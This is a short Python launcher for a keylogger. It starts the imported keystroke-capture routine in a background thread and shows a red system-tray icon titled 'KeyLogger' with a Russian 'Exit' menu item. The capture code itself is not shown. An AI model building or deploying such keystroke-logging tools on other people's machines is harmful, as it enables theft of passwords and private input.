import pystray
from pystray import MenuItem as item
from PIL import Image, ImageDraw
import threading
from src.core import keylogger


def create_icon():
    image = Image.new('RGB', (64, 64), color='black')
    draw = ImageDraw.Draw(image)
    draw.ellipse((16, 16, 48, 48), fill='red')
    return image


def run_logger():
    keylogger.start_keylogger()


def setup_tray():
    icon = pystray.Icon("keylogger")
    icon.icon = create_icon()
    icon.title = "KeyLogger"
    icon.menu = (
        item('Выход', lambda: icon.stop()),
    )

    threading.Thread(target=run_logger, daemon=True).start()
    icon.run()


if __name__ == '__main__':
    setup_tray()
